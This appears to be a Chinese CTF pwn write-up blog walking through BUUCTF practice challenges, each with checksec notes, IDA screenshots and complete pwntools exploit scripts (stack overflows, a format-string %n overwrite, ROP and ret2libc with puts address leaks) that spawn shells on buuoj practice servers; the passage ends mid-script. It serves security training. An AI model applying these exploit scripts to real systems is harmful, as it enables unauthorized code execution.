<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">25426</span>)</span><br><span class="line">adress = <span class="number">0x0000000000400596</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">128</span>+<span class="number">8</span>) + p64(adress)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240719163203180-1312944885.png" alt="image-20240719163202924"></p>
<h2 id="0x07-第五空间2019-决赛-PWN5"><a href="#0x07-第五空间2019-决赛-PWN5" class="headerlink" title="0x07 [第五空间2019 决赛]PWN5"></a>0x07 [第五空间2019 决赛]PWN5</h2><p>先手查了一下保护，woc，居然给栈保护干开了，感觉不太好打</p>
<p><img src="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240719163452409-836377749.png" alt="image-20240719163451817"></p>
<p>拉进ida瞅瞅先</p>
<p><img src="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240719191542016-1419439437.png" alt="image-20240719191541816"></p>
<p>一开始想直接用第二个read造一手溢出，但是长度不够，read的长度限制只给了99个字符（对了，栈好像还是有保护的，猪逼了这波。。。</p>
<p><img src="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240719191436878-1756487929.png" alt="image-20240719191435922"></p>
<p>学一手格式化字符串漏洞说是，感觉也就那么回事儿，这题思路主要就是用格式化字符串的漏洞来过，学了一手妙妙小连招，直接<code>AAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p</code>，因为此处的printf漏了个可以打的破绽，有没有感觉怪怪的，一般的格式都是<code>printf(&quot;%s&quot;,buf)</code>这样才对，这块儿给他弄一下，按照上面的格式看看程序怎么跑的</p>
<p><img src="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240723150842642-493501482.png" alt="image-20240723150842132"></p>
<p>如下图，已知AAAA的十六进制为0x41，而%p的作用是打印栈上的指针地址的内容，也就是说，当我们输入的参数被压入栈后，往后数10个地方才是再次调用它的地方，偏移也就是10，那么就可以直接使用%n来打这个格式化字符串的漏洞，%n的作用是将输出的数的字节数写入对应地址去，而<code>%x$n</code>，其中的x意指的是对应的偏移数，比如此处使用<code>%10$n</code>的话即是向偏移为10的地方进行写入成功打印的字节长度。</p>
<p><img src="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240723151141744-1201944443.png" alt="image-20240723151141552"></p>
<p>按照程序的逻辑来说，当我们第二次密码的输入和该变量的值相等时就能直接拿shell，所以我们只需要使用上述所属的方法，往这个对应地址里覆盖掉随机生成的随机数密码即可，而用来覆盖的即是我们传入的字节长度</p>
<p><img src="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240723151822375-1481558494.png" alt="image-20240723151822155"></p>
<p><img src="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240723151953572-1932074411.png" alt="image-20240723151953629"></p>
<p>exp启动：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">25028</span>)</span><br><span class="line">bss=<span class="number">0x0804C044</span></span><br><span class="line">payload1 =p32(bss)+<span class="string">b&#x27;%10$n&#x27;</span></span><br><span class="line">p.send(payload1)</span><br><span class="line">p.send(<span class="string">b&#x27;4&#x27;</span>) <span class="comment">#密码写4的原因是上述地址0x0804c044作为修改%10$n的字节长度了，用于触发了printf的格式化字符串漏洞，而它的字节长度刚好为4</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="0x08-穿插一道这周打awd遇到的pwn题"><a href="#0x08-穿插一道这周打awd遇到的pwn题" class="headerlink" title="0x08 (穿插一道这周打awd遇到的pwn题)"></a>0x08 (穿插一道这周打awd遇到的pwn题)</h2><h2 id="0x09-jarvisoj-level2"><a href="#0x09-jarvisoj-level2" class="headerlink" title="0x09 jarvisoj_level2"></a>0x09 jarvisoj_level2</h2><p>经典看保护</p>
<p><img src="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240723155734658-1792825118.png" alt="image-20240723155734718"></p>
<p>栈保护没开，最开心的一集，read直接造溢出了</p>
<p><img src="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240723155707223-1859630429.png" alt="image-20240723155707264"></p>
<p>ida里搜一下字符串（f12），由于这题直接给的system函数，但是把后门作为数据藏在了数据段，所以跳两次跳到这儿就好了</p>
<p><img src="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240723155836623-334973927.png" alt="image-20240723155836766"></p>
<p>分别找到system命令函数的地址，然后还是同样的栈溢出打，136+4，因为是32位的，覆盖一下save esp直接到system函数地址了，然后同样也是覆盖一下save esp，也是用4个字节，然后跳到命令的地址直接执行就好了</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28583</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn7&quot;</span>)</span><br><span class="line"></span><br><span class="line">sysy = <span class="number">0x08048320</span></span><br><span class="line"></span><br><span class="line">comond = <span class="number">0x0804A024</span></span><br><span class="line"></span><br><span class="line">payload =<span class="string">b&#x27;a&#x27;</span>*(<span class="number">136</span>+<span class="number">4</span>) + p32(sysy) + <span class="string">b&#x27;a&#x27;</span>*(<span class="number">4</span>) + p32(comond)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="0x0A-ciscn-2019-n-8"><a href="#0x0A-ciscn-2019-n-8" class="headerlink" title="0x0A  ciscn_2019_n_8"></a>0x0A  ciscn_2019_n_8</h2><p>也是罕见的开上了不少保护哇</p>
<p><img src="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240723160231009-1966521130.png" alt="image-20240723160231132"></p>
<p>拉进ida瞅一眼的，程序逻辑是让var的[13]&#x3D;&#x3D;0x11，动调看一下var是什么结构的</p>
<p><img src="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240723162059482-452491860.png" alt="image-20240723162059520"></p>
<p>输入zzzz，然后在var中发现是四个字节一组</p>
<p><img src="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240723162328529-250903826.png" alt="image-20240723162328592"></p>
<p>为了使得var[13]得到目标值，直接上payload，对于字节的概念还是有点小模糊，打印一下看看，<code>p8()</code>将整数 0x11 转换为一个字节（8位无符号整数），而<code>p32()</code>是四个字节，<code>p64()</code>是八个字节</p>
<p><img src="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240723163157549-511912284.png" alt="image-20240723163157463"></p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">io=remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">29551</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">13</span>*<span class="number">4</span>)+p8(<span class="number">0x11</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br><span class="line"><span class="comment"># print(p32(0x11))</span></span><br><span class="line"><span class="comment"># print(p8(0x11))</span></span><br><span class="line"><span class="comment"># print(p64(0x11))</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="0x0B-bjdctf-2020-babystack"><a href="#0x0B-bjdctf-2020-babystack" class="headerlink" title="0x0B bjdctf_2020_babystack"></a>0x0B bjdctf_2020_babystack</h2><p>先查保护，最不喜欢的栈保护没开，太棒啦</p>
<p><img src="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240723163803318-884706692.png" alt="image-20240723163803230"></p>
<p>ida启动！就简单的栈溢出，差点被这个12给骗了，最后算了一下偏移才知道偏移是0x10</p>
<p><img src="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240723170420607-232522171.png" alt="image-20240723170420510"></p>
<p>找到后门之后直接正常搓脚本就行了</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28975</span>)</span><br><span class="line"></span><br><span class="line">address = <span class="number">0x00000000004006E6</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">16</span>+<span class="number">8</span>)+p64(address)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">&#x27;32&#x27;</span>)<span class="comment">#16+8+8=32(即使你下面输入的字节数,请看payload的值)</span></span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="0x0C-ciscn-2019-c-1"><a href="#0x0C-ciscn-2019-c-1" class="headerlink" title="0x0C ciscn_2019_c_1"></a>0x0C ciscn_2019_c_1</h2><p>正常看保护</p>
<p><img src="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240723184904512-1498288762.png" alt="image-20240723184903894"></p>
<p>拉进ida没有查看到什么可打的点，跟几个函数看看</p>
<p><img src="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240724102338846-558865372.png" alt="image-20240724102339046"></p>
<p>begin里面是做选择，也没有可打的点</p>
<p><img src="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240724102511006-2123606605.png" alt="image-20240724102511447"></p>
<p>？！encrypt里有最喜欢的gets，好极了，算是有触发点了</p>
<p><img src="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240724102536807-647590419.png" alt="image-20240724102537134"></p>
<p>f12翻找了一下，没有最喜欢的后门，看来这把只能自己构造了，参照[<a target="_blank" rel="noopener" href="https://blog.csdn.net/Lucien_Carr/article/details/137481503">BUUCTF]ciscn_2019_c_1_buuctf中ciscn——2019-CSDN博客</a></p>
<p>先找pop rdi这条指令的地址，直接借助工具找<code>ROPgadget  --binary &#39;filename&#39; |grep &quot;pop rdi&quot;  # filename填自己的文件名</code></p>
<p><img src="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240724102123898-963604324.png" alt="image-20240724102123057"></p>
<p>这个rdi用处不小，后面用来存参数然后进行跳转，同时需要注意本题给了提示是，Ubuntu 18同时又是64位，我们需要libc的对应版本，直接去BUU的资料上找就好了</p>
<p><img src="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240724195054068-829976743.png" alt="image-20240724195053300"></p>
<p><img src="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240724195233416-1153168380.png" alt="image-20240724195233747"></p>
<p>got表：包含函数的真实地址，包含libc函数的基址，用于泄露地址</p>
<p>plt表：不用知道libc函数真实地址，使用plt地址就可以调用函数</p>
<p>libc是linux下的c函数库，包含各种常用的函数，在程序执行时才被加载到内存中，libc是一定可以执行的，跳转到libc中函数绕过NX保护</p>
<p>直接上exp:（建议先学rop，不然下列代码有点。。。）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;arm64&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">27031</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn10&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main_adress = <span class="number">0x0000000000400B28</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">rdi_adress = <span class="number">0x0000000000400c83</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;Input your choice!\n&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)<span class="comment">#gets栈溢出的填充需求为0x50，加8覆盖save rbp，然后才到reten，减1是因为用来跳出加密的&#x27;\0&#x27;作为第一个字符</span></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&quot;a&quot;</span>*(<span class="number">0x50</span>+<span class="number">8</span>-<span class="number">1</span>) + p64(rdi_adress) + p64(puts_got) + p64(puts_plt) + p64(main_adress)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Input your Plaintext to be encrypted\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;Ciphertext\n&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">puts_address = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">0x8</span>,<span class="string">b&#x27;\x00&#x27;</span>))<span class="comment">#大多是系统库函数的地址,这些地址通常是64位系统中的6个字节有效数据，而最高两个字节通常为零，因此只需要读取6个字节,并且将6个字节填充为8个字节，确保地址格式符合64位系统的标准</span></span><br><span class="line">libc_puts_address = libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">libc_base = puts_address - libc_puts_address</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;Input your choice!\n&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Input your Plaintext to be encrypted\n&quot;</span>)</span><br><span class="line">sys_address = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_address = libc_base + libc.search(<span class="string">&#x27;bin/sh\x00&#x27;</span>).__next__() <span class="comment">#__next__()表示找到的第一个bin/sh的地址</span></span><br><span class="line">end_address = <span class="number">0x0000000000400C1C</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&quot;a&quot;</span>*(<span class="number">0x50</span>+<span class="number">8</span>-<span class="number">1</span>)+ p64(end_address) + p64(rdi_adress) + p64(bin_address) + p64(sys_address)</span><br><span class="line"></span><br><span class="line">io.sendline(payload1)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="0x0D-get-started-3dsctf-2016"><a href="#0x0D-get-started-3dsctf-2016" class="headerlink" title="0x0D get_started_3dsctf_2016"></a>0x0D get_started_3dsctf_2016</h2><p>也是查上保护了</p>
<p><img src="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240724195953911-592997116.png" alt="image-20240724195954368"></p>
<p>就经典栈溢出，32位的栈上传参就好了，但是此处记得跟一个exit的地址，因为没有开启标准输入输出，所以flag的读取都是存在缓冲区的，跟一个exit使得函数返回，使flag有回显。</p>
<p><img src="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240725093229161-1159862954.png" alt="image-20240725093229189"></p>
<p><img src="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240725093423612-889846246.png" alt="image-20240725093424505"></p>
<p>还有个问题就是，在主函数中并还没有push ebp的操作，所以这题也不需要用来覆盖save ebp 的四个字节</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">25303</span>)</span><br><span class="line"></span><br><span class="line">target_address = <span class="number">0x080489A0</span></span><br><span class="line">a1 = <span class="number">0x308CD64F</span></span><br><span class="line">a2 = <span class="number">0x195719D1</span></span><br><span class="line">exit_address = <span class="number">0x0804E6A0</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x38</span>)+ p32(target_address) +p32(exit_address) + p32(a1) + p32(a2)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br><span class="line"> </span><br></pre></td></tr></table></figure>



<h2 id="0x0E-jarvisoj-level2-x64"><a href="#0x0E-jarvisoj-level2-x64" class="headerlink" title="0x0E jarvisoj_level2_x64"></a>0x0E jarvisoj_level2_x64</h2><p>查保护先，没有栈保护，最喜欢的一集</p>
<p><img src="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240725100059309-385242951.png" alt="image-20240725100059749"></p>
<p>read直接造溢出了，同时给了system和bin&#x2F;sh，64位寄存器传参直接打了,先找pop rdi这条指令的地址，直接借助工具找<code>ROPgadget  --binary &#39;filename&#39; |grep &quot;pop rdi&quot;  # filename填自己的文件名</code></p>
<p><img src="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240725100201079-962214614.png" alt="image-20240725100202013"></p>
<p><img src="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240725100312040-858256791.png" alt="image-20240725100312512"></p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;arm64&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28426</span>)</span><br><span class="line"></span><br><span class="line">sys_address = <span class="number">0x00000000004004C0</span></span><br><span class="line">bin_sh_address = <span class="number">0x0000000000600A90</span></span><br><span class="line"></span><br><span class="line">rdi_address = <span class="number">0x00000000004006b3</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>)+p64(rdi_address)+p64(bin_sh_address)+p64(sys_address)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="0x10-HarekazeCTF2019-baby-rop"><a href="#0x10-HarekazeCTF2019-baby-rop" class="headerlink" title="0x10 [HarekazeCTF2019]baby_rop"></a>0x10 [HarekazeCTF2019]baby_rop</h2><p>先查保护，栈保护没开，最喜欢的一集</p>
<p><img src="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240725100635826-856308375.png" alt="image-20240725100636573"></p>
<p>和上一道题一样的思路打就行</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">io=remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28794</span>)</span><br><span class="line">sys_address = <span class="number">0x0000000000400490</span></span><br><span class="line">bin_sh_address = <span class="number">0x0000000000601048</span></span><br><span class="line">rdi_address = <span class="number">0x0000000000400683</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>)+p64(rdi_address)+p64(bin_sh_address)+p64(sys_address)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>就是最后cat flag的时候要注意，它flag不是放在根目录的，先输入<code>find -name flag</code>找一下，确定路径之后直接cat</p>
<p><img src="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240725102557097-1633438421.png" alt="image-20240725102557870"></p>
<p><img src="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240725102639453-1656278905.png" alt="image-20240725102640404"></p>
<h2 id="0x11-others-shellcode"><a href="#0x11-others-shellcode" class="headerlink" title="0x11 others_shellcode"></a>0x11 others_shellcode</h2><p>先看保护</p>
<p><img src="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240725104214852-1918520874.png" alt="image-20240725104215667"></p>
<p>直接看程序逻辑，main里面直接走getshell的逻辑了</p>
<p><img src="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240725104008826-1011489388.png" alt="image-20240725104009220"></p>
<p>本地运行了一下，直接拿shell了，抽象，nc一下直接出了</p>
<p><img src="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240725104147587-2027964507.png" alt="image-20240725104148200"></p>
<h2 id="0x12-OGeek2019-babyrop"><a href="#0x12-OGeek2019-babyrop" class="headerlink" title="0x12 [OGeek2019]babyrop"></a>0x12 [OGeek2019]babyrop</h2><p>先查一手保护</p>
<p><img src="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240725105510576-1026144114.png" alt="image-20240725105511279"></p>
<p>先从随机数文件中给读取一组随机数到buf</p>
<p><img src="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240725193615892-561764441.png" alt="image-20240725193615166"></p>
<p>进第二个函数 sub_804871F，提示用户输入并与先前的随机数进行check，返回值为零才正常返回这个函数，否则直接退出，这块儿还是想办法绕过这个check，直接用<code>\x00</code>就好了，同时注意一下返回的值，是buf[7]</p>
<p><img src="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240725193746683-1519689447.png" alt="image-20240725193747500"></p>
<p>继续看下一个函数 sub_80487D0 ，上个函数返回出来的buf[7]充当参数传进这个函数，通知将a1作为read的读取字符数量参数进行使用，这不就是送上门的栈溢出吗</p>
<p><img src="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240725194027576-618908851.png" alt="image-20240725194028249"></p>
<p>总结一下思路直接写了，同样也是先泄露put的地址然后计算libc的基址</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">io=remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">27466</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn15&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;pwn15&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach()</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">main_address = <span class="number">0x08048825</span></span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">libc_putaddress = libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&#x27;\xff&#x27;</span>*<span class="number">7</span></span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">payload11 = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xE7</span>+<span class="number">4</span>)+p32(puts_plt)+p32(main_address)+p32(puts_got)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;Correct\n&quot;</span>,payload11)</span><br><span class="line">puts_address = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_address))</span><br><span class="line"></span><br><span class="line">libc_base = puts_address - libc_putaddress</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">sys_address = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sysreal_address = libc_base + sys_address</span><br><span class="line">bin_address = libc_base+libc.search(<span class="string">&#x27;bin/sh\x00&#x27;</span>).__next__()</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&#x27;\xff&#x27;</span>*<span class="number">7</span></span><br><span class="line">io.sendline(payload1)</span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xE7</span>+<span class="number">4</span>)+p32(sysreal_address)+p32(<span class="number">666</span>)+p32(bin_address) <span class="comment">#其中666是随便写的，只要给system函数一个返回地址就行，保持32位的payload格式padding+p32(system)+p32(返回地址2)+p32(bin_sh)</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span 